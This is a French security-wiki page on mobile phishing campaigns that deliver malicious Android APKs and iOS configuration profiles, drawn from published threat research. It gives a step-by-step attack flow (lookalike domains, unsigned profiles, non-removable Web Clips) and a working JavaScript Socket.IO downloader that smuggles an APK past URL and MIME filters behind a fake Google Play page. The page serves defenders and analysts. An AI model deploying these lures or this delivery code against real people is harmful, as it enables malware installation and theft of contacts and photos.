# Phishing mobile et distribution d’applications malveillantes (Android et iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Cette page présente les techniques utilisées par les acteurs malveillants pour distribuer des **APK Android malveillants** et des **profils de configuration mobile iOS** par phishing (SEO, ingénierie sociale, faux stores, applications de rencontre, etc.).
> Le contenu est adapté de la campagne SarangTrap révélée par Zimperium zLabs (2025) et d’autres recherches publiques.<sup>[[1]](#references)</sup>

## Déroulement de l’attaque

1. **Infrastructure SEO/Phishing**
   * Enregistrer des dizaines de domaines ressemblants (rencontres, partage cloud, service automobile…).
     – Utiliser des mots-clés dans la langue locale et des emojis dans l’élément `<title>` pour améliorer le classement sur Google.
     – Héberger les instructions d’installation Android (`.apk`) et iOS sur la même page d’accueil.
2. **Téléchargement de la première étape**
   * Android : lien direct vers un APK *non signé* ou provenant d’un « store tiers ».
   * iOS : lien `itms-services://` ou HTTPS direct vers un profil **mobileconfig** malveillant (voir ci-dessous).
3. **Comportement post-installation d’Android**
   * L’exécution contrôlée par C2, l’abus des permissions, le contournement des droppers, la collecte en arrière-plan et les autres comportements malveillants post-installation sont présentés dans la page dédiée à l’exploitation post-installation des malware Android ci-dessous.
4. **Technique de distribution iOS**
   * Un seul **profil de configuration mobile** peut demander `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration`, etc., afin d’inscrire l’appareil dans une supervision de type « MDM ».
   * Instructions d’ingénierie sociale :
     1. Ouvrir Réglages ➜ *Profil téléchargé*.
     2. Appuyer trois fois sur *Installer* (captures d’écran sur la page de phishing).
     3. Faire confiance au profil non signé ➜ l’attaquant obtient les autorisations *Contacts* et *Photos* sans examen par l’App Store.
5. **Payload Web Clip iOS (icône d’application de phishing)**
   * Les payloads `com.apple.webClip.managed` peuvent **épingler une URL de phishing à l’écran d’accueil** avec une icône/étiquette de marque.
   * Les Web Clips peuvent s’exécuter **en plein écran** (masquant l’interface du navigateur) et être définis comme **non supprimables**, obligeant la victime à supprimer le profil pour retirer l’icône.<sup>[[3]](#references)</sup>
6. **Couche réseau**
   * HTTP non chiffré, souvent sur le port 80 avec un en-tête HOST du type `api.<phishingdomain>.com`.
   * `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (sans TLS → facile à repérer).

## Exploitation post-installation d’Android

Pour les techniques de malware Android post-installation, notamment C2, l’abus d’Accessibility, les overlays, l’automatisation ATS, le chargement de DEX par étapes, les SMS surtaxés et la persistance, consultez :

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## APK Smuggling par Socket.IO/WebSocket et fausses pages Google Play

Les attaquants remplacent de plus en plus les liens statiques vers des APK par un canal Socket.IO/WebSocket intégré à des leurres imitant Google Play. Cela dissimule l’URL du payload, contourne les filtres d’URL/d’extension et conserve une expérience d’installation réaliste.<sup>[[2]](#references)[[4]](#references)</sup>

Flux client typique observé sur le terrain :

<details>
<summary>Téléchargeur Socket.IO imitant Play (JavaScript)</summary>

```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
  const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url; a.download = "app.apk"; a.style.display = "none";
  document.body.appendChild(a); a.click();
});
```

</details>

Pourquoi cela échappe aux contrôles simples :
- Aucune URL APK statique n’est exposée ; le payload est reconstruit en mémoire à partir des trames WebSocket.
- Les filtres d’URL/MIME/extension qui bloquent les réponses .apk directes peuvent laisser passer les données binaires acheminées via WebSockets/Socket.IO.
- Les crawlers et les sandbox d’URL qui n’exécutent pas les WebSockets ne récupéreront pas le payload.

Voir aussi le tradecraft et les outils WebSocket :

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References

- [1] [La face sombre de la romance : campagne d’extorsion SarangTrap](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Paramètres de payload Web Clips pour les appareils Apple](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [Cheval de Troie bancaire ciblant les utilisateurs Android indonésiens et vietnamiens](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
{{#include ../../banners/hacktricks-training.md}}
